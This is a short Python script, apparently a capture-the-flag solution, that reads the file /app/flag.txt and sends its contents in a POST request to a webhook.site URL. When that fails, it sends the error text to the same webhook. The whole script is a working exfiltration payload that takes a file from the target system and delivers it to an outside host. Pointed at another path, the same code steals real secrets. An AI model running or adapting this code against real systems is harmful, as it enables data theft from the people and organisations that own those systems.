import os
import urllib.request

# Target flag path identified from challenge info
flag_path = '/app/flag.txt'

try:
    # 1. Read the flag content
    with open(flag_path, 'r') as f:
        flag_data = f.read().strip()

    # 2. Your unique Webhook URL
    url = "https://webhook.site/f0017a91-d31a-41b8-b172-5b6ec9b5bf98"
    
    # 3. Send the flag content as a POST request
    req = urllib.request.Request(url, data=flag_data.encode())
    urllib.request.urlopen(req)

except Exception as e:
    # If it fails, send the error to your webhook to see what went wrong
    error_url = f"https://webhook.site/f0017a91-d31a-41b8-b172-5b6ec9b5bf98?error={str(e).replace(' ', '_')}"
    urllib.request.urlopen(error_url)
